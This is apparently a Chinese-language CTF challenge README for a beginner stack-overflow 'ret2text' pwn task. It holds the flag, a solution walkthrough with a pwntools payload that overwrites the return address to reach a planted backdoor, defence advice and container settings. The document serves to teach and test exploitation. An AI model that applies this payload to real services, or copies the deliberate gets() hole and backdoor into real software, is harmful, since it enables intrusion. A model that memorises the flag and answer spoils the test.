# pwn-ret2text

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 易 |
| 考点 | 栈溢出覆盖返回地址；ret2text；ret 进入函数时的栈对齐 |
| 容器端口 | 宿主机 9102 → 容器 1337 |
| Flag | `flag{ret2text_jump_to_the_backdoor}` |

## 题面（直接复制到平台「简介」）

一个只做"读一行、回一句"的测试程序，flag 放在容器里的 `/app/flag`。用 `nc <地址> 9102` 连上去，会看到 `input:` 提示。目标：让程序把 flag 打印出来。

**提示**：`nm` 或 `objdump -d` 会把程序里所有函数列出来，`main` 之外还有没有别的函数，它平时会不会被调用？

## 二、题目描述

```
nc <host> 9102
input:
```

程序里有一个从不被调用的函数 `backdoor()`，内容是 `system("cat /app/flag")`。
`main` 用 `gets(buf)` 读入 64 字节的缓冲区，没有任何长度检查。

## 三、解题步骤

1. 找 `backdoor` 地址：

```bash
nm files/pwn | grep backdoor
# 0000000000401196 T backdoor
readelf -s files/pwn | grep backdoor      # 等价写法
```

2. 找返回地址偏移：

```bash
objdump -d files/pwn | sed -n '/<main>:/,/ret/p'
```

```asm
4011ed: lea    rax,[rbp-0x40]     # buf
4011f4: call   401090 <gets@plt>
40120d: leave
40120e: ret
```

`buf` 在 `rbp-0x40`。返回地址在 `rbp+8`，偏移 = `0x40 + 8 = 72` 字节。

也可以用 cyclic 定位：

```bash
python3 -c "from pwn import *; print(cyclic(120))" | nc <host> 9102
# 崩溃地址若为 0x6161616... 就用 cyclic_find 反查
python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
```

3. 生成 exp 并运行：

```bash
python3 exp/exp.py
```

```python
p.recvuntil(b'input:')
p.sendline(b'A' * 72 + p64(0x401196))
```

输出：

```
bye
flag{...}
```

## 四、原理

`main` 的 `leave` 等价于 `mov rsp, rbp; pop rbp`，之后 `ret` 从 `[rbp+8]` 弹出返回地址。
`gets` 写超过 64 字节就会先写坏 `[rbp]`（保存的 `rbp`），再写坏 `[rbp+8]`（返回地址）。
把 `[rbp+8]` 换成 `backdoor` 的地址，`ret` 就跳到 `backdoor`。

**栈对齐**：ABI 要求进入函数时 `rsp % 16 == 8`（`call` 压入 8 字节返回地址）。
用 `ret` 跳进函数时 `rsp % 16 == 0`，比 `call` 少一层，glibc 的 `system` 内部
`movaps` 会因此段错误。本题的 `backdoor` 带 `__attribute__((force_align_arg_pointer))`，
函数入口执行 `and rsp, -16` 自行对齐，所以直接跳即可。
换到别的题目上如果 `system` 崩，链子里加一个单独的 `ret` gadget 补 8 字节。

## 五、防御建议

- `gets` 换成 `fgets(buf, sizeof buf, stdin)`。
- 开启 PIE：`backdoor` 的地址不再固定，需要先泄露代码基址。
- 开启 `-fstack-protector-all`：覆盖返回地址前会先破坏 canary。
- 不需要的函数不要留在二进制里，本题的 `backdoor` 就是白送的跳板。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键地址：`backdoor = 0x401196`，`main = 0x4011b4`，返回地址偏移 72。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-ret2text` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-ret2text` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
